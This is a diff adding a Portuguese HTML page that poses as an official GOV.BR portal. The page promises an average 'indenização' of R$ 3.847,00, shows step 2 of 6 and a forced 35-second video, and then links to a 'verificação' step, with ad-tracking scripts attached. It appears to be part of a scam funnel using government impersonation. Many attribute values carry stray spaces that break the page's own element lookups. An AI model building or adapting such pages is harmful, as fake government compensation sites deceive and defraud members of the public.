@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type" />
+    <title>Consulta - educacional -4</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" blocking=render></script>
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100..900;1,100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+</head>
+
+<body class="w-full overflow-x-hidden font-[Poppins]">
+    <style>
+        @keyframes pulse-scale {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .animate-pulse-scale {
+            animation: pulse-scale 1s ease-in-out infinite;
+        }
+    </style>
+
+    <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+        <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+            <div class="px-4 py-2">
+                <div class="flex justify-between items-center">
+                    <div class="flex items-center space-x-3">
+                        <img alt="Logo GOV.BR" class="h-6 w-auto" src="./assets/img/Gov-br-logo-svg.png">
+                        <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+                        <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <div class="flex items-center space-x-1 text-xs text-gray-500">
+                            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                            <span class="hidden sm:inline">Seguro</span>
+                        </div>
+                        <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
+                        <span class="font-medium" id="nameHeader"></span>
+                    </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+
+        <div class="h-8"></div>
+
+        <main class="pt-10 pb-8 px-4">
+            <div class="max-w-md mx-auto">
+                <div class="mb-6">
+                    <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                        <span class="font-medium">Educação</span>
+                        <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">2 de 6</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                        <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 33.3333%;"></div>
+                    </div>
+                    <p class="text-xs text-gray-500 text-center">Entenda seus direitos</p>
+                </div>
+                <div class=" bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                    <div class=" bg-gradient-to-r from-blue-600 to-blue-700 text-white p-3 sm:p-4 text-center">
+                        <div class=" flex items-center justify-center space-x-2 mb-2">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class=" w-4 h-4 sm:w-5 sm:h-5"><path d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" class=""></path></svg>
+                            <span class=" font-bold text-xs sm:text-sm">ENTENDA SEUS DIREITOS</span>
+                        </div>
+                        <p class=" text-xs opacity-90">Assista ao vídeo para entender melhor</p>
+                    </div>
+                    <div class=" p-4 sm:p-6">
+                        <div class=" text-center mb-4 sm:mb-6">
+                            <h2 class=" text-lg sm:text-xl font-bold text-gray-900 mb-2">
+                                Indenização: Seu por Direito
+                            </h2>
+                            <p class=" text-gray-600 text-sm">
+                                Assista ao vídeo explicativo de
+                                <strong class="">35 segundos</strong> para entender seus direitos
+                            </p>
+                        </div>
+                        <div class=" mb-4 sm:mb-6">
+                            <div class="relative w-full max-w-xl mx-auto">
+                                <!-- Vídeo -->
+                                <video id="video2" class="w-full rounded-md" ">
+                                <source src="./assets/video/video2.mp4 " type="video/mp4 ">
+                                Seu navegador não suporta vídeo.
+                            </video>
+
+                            <!-- Botão centralizado sobre o vídeo -->
+                            <div id="overlay2 " class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-30 ">
+                                <button onclick="playVideo2() " class="flex flex-col items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-sm shadow-lg transition-transform hover:scale-105 animate-pulse-scale ">            
+                                    <span class="text-sm ">Clique para ouvir</span>
+                                    <!-- Ícone -->
+                                    <svg xmlns="http://www.w3.org/2000/svg " width="48 " height="48 " viewBox="0 0 24 24 " fill="none " stroke="currentColor " stroke-width="2 " stroke-linecap="round " stroke-linejoin="round " class="lucide lucide-volume-x-icon
+                                    lucide-volume-x "><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z "/><line x1="22 " x2="16
+                                    " y1="9 " y2="15 "/><line x1="16 " x2="22 " y1="9 " y2="15 "/></svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=" grid grid-cols-1 gap-4 mb-4 sm:mb-6 ">
+                        <div class=" bg-green-50 border border-green-200 rounded-xl p-3 sm:p-4 ">
+                            <div class=" flex items-center space-x-3 ">
+                                <div class=" w-8 h-8 sm:w-10 sm:h-10 bg-green-100 rounded-full flex items-center justify-center ">
+                                    <svg fill="currentColor " viewBox="0 0 20 20 " class=" w-4 h-4 sm:w-5 sm:h-5 text-green-600 "><path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6
+                                    4a2 2 0 100-4 2 2 0 000 4z " class=" "></path></svg>
+                                </div>
+                                <div class=" ">
+                                    <h4 class=" font-bold text-green-800 text-sm ">Valor Médio Resgatado</h4>
+                                    <div class=" text-lg sm:text-xl font-bold text-green-600 ">R$ 3.847,00</div>
+                                    <p class=" text-green-700 text-xs ">Por pessoa em 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-3 " id="watchingVideo ">
+                        <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center ">
+                            <div class="flex items-center justify-center space-x-2 text-amber-700 ">
+                                <svg fill="none " viewBox="0 0 24 24 " class="w-5 h-5 animate-spin ">
+                                    <circle cx="12 " cy="12 " r="10 " stroke="currentColor " stroke-width="4 " class="opacity-25 "></circle>
+                                    <path fill="currentColor " d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z " class="opacity-75 "></path>
+                                </svg>
+                                <span class="text-sm font-medium ">Assista ao vídeo para continuar</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                    <a href="../verificacao/ " id="button4 " class="hidden w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-xl transition-all duration-300
+                                    shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 touch-target ">
+                        <span class=" ">VERIFICAR MINHA SITUAÇÃO</span>
+                        <svg fill="currentColor " viewBox="0 0 20 20 " class="w-4 h-4 sm:w-5 sm:h-5 "><path fill-rule="evenodd " d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1
+                                    1 0 010-1.414z " clip-rule="evenodd " class="jsx-96e84011cc6b9f63 "></path></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+       
+
+    </main>
+</div>
+
+<script>
+     const nameValue = localStorage.getItem("name ") || " ";
+    const formattedName = nameValue.split(" ")[0];
+
+    document.getElementById("nameHeader ").textContent = formattedName;
+
+    function playVideo2() {
+        const video = document.getElementById('video2');
+        const overlay = document.getElementById('overlay2');
+        video?.play();
+        overlay?.classList?.add('hidden');
+    }
+
+    setTimeout(() => { 
+        document.getElementById('button4')?.classList?.remove('hidden'); 
+        document.getElementById('watchingVideo')?.classList?.add('hidden');
+    }, 38000);
+</script>
+    
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015 " integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{" version
+                                    ":"2024.11.0 ","token ":"839824964e1143f3811effcdab6e94ca ","r ":1,"server_timing ":{"name ":{"cfCacheStatus ":true,"cfEdge ":true,"cfExtPri ":true,"cfL4 ":true,"cfOrigin ":true,"cfSpeedBrain ":true},"location_startswith
+                                    ":null}}' crossorigin="anonymous "></script>
+</body>
+
+</html>
